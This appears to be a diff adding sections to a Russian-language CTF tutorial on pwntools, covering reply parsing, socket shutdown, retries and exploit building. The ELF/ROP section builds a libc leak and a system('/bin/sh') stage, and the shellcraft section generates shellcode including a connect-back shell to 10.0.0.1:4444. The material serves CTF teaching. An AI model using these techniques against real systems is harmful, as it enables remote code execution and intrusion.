@@ -180,6 +180,103 @@ $ socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./chall
 - **Хрупкий regex** → тестируй на сырых ответах (`print(repr(line))`).
 - **Потеря соединения** → оборачивай цикл в `try/except EOFError` и переподключайся.
 
+<!-- deepen-mm1 -->
+## Парсинг ответа: re и struct
+
+Сервис отвечает в свободной форме, и вытащить числа удобнее регуляркой, чем нарезкой по
+смещениям:
+
+```python
+import re
+data = io.recvuntil(b'? ')
+nums = list(map(int, re.findall(rb'-?\d+', data)))
+io.sendline(str(sum(nums)).encode())
+```
+
+Для бинарных протоколов используйте `struct` или родные `u32`/`u64`:
+
+```python
+import struct
+val, = struct.unpack('<I', io.recvn(4))
+```
+
+`recvn(n)` гарантирует ровно `n` байт (в отличие от `recv`, который может вернуть меньше) —
+это ключ к разбору бинарного формата без «съезжания» на границах.
+
+## Управление потоком: send/recv и shutdown
+
+pwntools-труба похожа на сокет, но у неё есть удобные надстройки. `recvuntil` читает до
+маркера, `recvline` — до перевода строки, `clean` — сбрасывает накопленное. Когда нужно
+дать сервису понять, что ввод закончился, закрывайте половину соединения:
+
+```python
+io.send(payload)
+io.shutdown('send')   # FIN: больше не пишем
+print(io.recvall())   # читаем всё, что вернёт сервис
+```
+
+`shutdown('send')` незаменим для программ, читающих stdin до EOF (`read(0, buf, n)`),
+иначе они будут ждать вечно.
+
+## ELF и ROP: разбор бинаря в pwntools
+
+`ELF` разбирает бинарник и отдаёт символы, GOT/PLT и адреса утечек, а `ROP` строит
+цепочку гаджетов:
+
+```python
+elf = ELF('./chall')
+libc = ELF('./libc.so.6')
+rop = ROP(elf)
+rop.call('write', [1, elf.got['read'], 8])
+io.send(rop.chain())
+```
+
+`elf.got['read']` — адрес GOT-записи, `rop.call` подбирает нужный гаджет `pop rdi; ret`
+автоматически. После утечки адреса libc пересчитывают базу
+(`libc.address = leak - libc.symbols['read']`) и строят вторую стадию (`system('/bin/sh')`).
+
+## Shellcraft и asm
+
+`shellcraft` генерирует ассемблерный шеллкод под целевую архитектуру, `asm` собирает его
+в байты:
+
+```python
+context.arch = 'amd64'
+payload = asm(shellcraft.sh())
+payload = asm(shellcraft.amd64.linux.connect('10.0.0.1', 4444))
+```
+
+Это экономит время при shellcode-задачах: не нужно вручную писать `execve("/bin/sh", ...)`.
+Учитывайте ограничения: `shellcraft.sh()` содержит нулевые байты, и при фильтрации
+символов его нужно заменить готовым «безнулевым» вариантом, а не простым удалением нулей.
+
+<!-- deepen-mm1b -->
+## Как не потерять соединение: retry и логирование
+
+Сетевой сервис может разорвать соединение (таймаут, рестарт). Оберните логику в функцию
+с повторными попытками и логируйте всё, что приходит:
+
+```python
+def solve_once(host, port):
+    io = remote(host, port)
+    io.recvuntil(b'? ')
+    io.sendline(b'42')
+    return io.recvall()
+
+for attempt in range(3):
+    try:
+        print(solve_once(HOST, PORT))
+        break
+    except EOFError:
+        print('retry', attempt)
+```
+
+`context.log_level = 'debug'` печатает каждый `send`/`recv` — незаменимо, когда скрипт
+«работает локально, но не удалённо». Логируйте в файл (`io = remote(...)` с
+перенаправлением через `tee`), чтобы после падения видеть последний обмен. И всегда
+передавайте хост и порт аргументами: один и тот же скрипт тогда гоняется и против
+`socat`-обёртки локально, и против реального сервиса.
+
 ## Квиз
 
 Проверь себя.
